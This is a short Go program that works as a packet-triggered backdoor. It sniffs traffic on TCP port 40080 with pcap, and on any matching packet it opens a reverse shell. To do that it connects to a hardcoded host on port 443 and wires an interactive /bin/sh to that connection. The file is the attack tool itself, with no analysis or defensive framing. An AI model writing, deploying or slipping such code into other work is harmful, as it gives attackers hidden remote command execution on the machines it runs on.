package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

const (
	CONN_HOST = "192.168.153.133"
	CONN_PORT = "443"
	CONN_TYPE = "tcp"

	//configure the gopacket input
	FILTER    = "tcp and port 40080"
	SNAPLEN   = int32(1600)
	PROMISC   = false
	INTERFACE = "any"
	TIMEOUT   = pcap.BlockForever
)

// decrease network traffic using singleton
var ATTEMPTSHELL = true

func genRevShell() {
	revConn, err := net.Dial(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	if err != nil {
		fmt.Println(err)
	} else {
		defer revConn.Close()
		ATTEMPTSHELL = false
		shell := exec.Command("/bin/sh", "-i")

		shell.Stderr = revConn
		shell.Stdin = revConn
		shell.Stdout = revConn

		shell.Run()
	}
	ATTEMPTSHELL = true
}

func main() {

	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Panicln(err)
	}

	for _, device := range devices {
		println("Found" + device.Name)
	}

	listener, err := pcap.OpenLive(INTERFACE, SNAPLEN, PROMISC, TIMEOUT)
	if err != nil {
		log.Panicln(err)
	}

	defer listener.Close()

	if err := listener.SetBPFFilter(FILTER); err != nil {
		log.Panicln(err)
	}

	for {
		source := gopacket.NewPacketSource(listener, listener.LinkType())
		if source != nil {
			fmt.Println(source.Packets())
			for packet := range source.Packets() {
				if ATTEMPTSHELL == true && packet.Data() != nil {
					genRevShell()
				}
			}
		}
	}
}
